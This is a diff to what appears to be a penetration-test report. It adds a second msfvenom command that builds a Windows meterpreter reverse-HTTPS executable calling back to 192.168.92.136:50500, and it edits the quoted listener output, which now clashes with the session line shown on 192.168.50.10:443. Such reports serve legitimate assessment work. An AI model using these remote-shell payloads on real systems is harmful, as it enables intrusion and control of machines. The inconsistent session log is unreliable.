@@ -54,6 +54,7 @@ The assessment identified a critical misconfiguration in the local security poli
 ```bash
 # Payload Generation
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=50500 -f exe -o RATa.exe
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=50500 -f exe -o RATb.exe
 
 # Listener Setup
 use exploit/multi/handler
@@ -65,7 +66,7 @@ run
 
 **Session Output Analysis:**
 Upon execution, the following session was established:
-`[*] Started reverse TCP handler on 192.168.50.10:443`
+`[*] Started reverse TCP handler on 192.168.92.136:50500`
 `[-] Handler failed to receive a payload (timed out)` *(Note: Initial attempt failed due to firewall)*
 `[*] Meterpreter session 1 opened (192.168.50.10:443 -> 192.168.50.25:49822)`
 
